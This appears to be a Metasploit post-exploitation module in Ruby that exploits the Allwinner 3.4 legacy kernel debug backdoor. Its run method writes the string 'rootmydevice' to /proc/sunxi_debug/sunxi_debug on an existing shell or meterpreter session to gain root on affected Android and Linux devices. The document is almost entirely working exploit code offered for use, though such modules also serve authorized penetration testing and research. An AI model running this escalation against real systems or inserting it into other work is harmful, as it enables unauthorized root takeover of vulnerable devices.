##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require "msf/core"
#require "rex"

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info={})
    super( update_info( info,
        "Name"           => "Allwinner 3.4 Legacy Kernel Local Privileges Escalation",
        "Description"    => %q{
          This module attempts to exploit a debug backdoor privilege escalation.
        },
        "License"        => MSF_LICENSE,
        "Author"         =>
          [
            "h00die <mike@stcyrsecurity.com>",  # Module
            "KotCzarny"                         # Discovery
          ],
        "Platform"       => [ "android", "linux" ],
        "DisclosureDate" => "Apr 30 2016",
        "References"     =>
          [
            [ "URL", "http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/"],
            [ "URL", "https://webcache.googleusercontent.com/search?q=cache:l2QYVUcDflkJ:https://github.com/allwinner-zh/linux-3.4-sunxi/blob/master/arch/arm/mach-sunxi/sunxi-debug.c+&cd=3&hl=en&ct=clnk&gl=us"],
            [ "URL", "http://irclog.whitequark.org/linux-sunxi/2016-04-29#16314390"]
          ],
        "SessionTypes"   => [ "shell", "meterpreter" ]
      ))

  end

  def run
    backdoor = "/proc/sunxi_debug/sunxi_debug"
    if file_exist?(backdoor)
      vprint_good "Backdoor found, exploiting."
      cmd_exec("echo rootmydevice > #{backdoor}")
      if is_root?
        print_good "Privilege Escalation Successful"
        report_note(
          :host => session,
          :type => "host.escalation",
          :data => "Escalated to root shell via backdoor"
        )
      else
        print_error "Privilege Escalation FAILED"
      end
    else
      print_error "Backdoor #{backdoor} not found."
    end
  end

end
